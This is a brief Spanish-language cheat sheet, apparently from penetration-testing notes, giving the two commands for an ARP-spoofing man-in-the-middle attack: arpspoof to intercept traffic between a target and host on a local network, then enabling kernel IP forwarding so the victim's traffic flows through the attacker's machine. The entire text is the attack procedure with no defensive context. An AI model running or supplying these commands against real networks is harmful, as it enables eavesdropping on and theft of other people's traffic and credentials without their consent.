### Interceptar tráfico entre 192.168.4.11(Target) y 192.168.4.16 (Host):
$ arpspoof -i {INTERFACE} -t {TARGET} -r {HOST}
### Habilitar el Linux Kernel IP Forwarding:
$ echo 1> /proc/sys/net/ipv4/ip_forward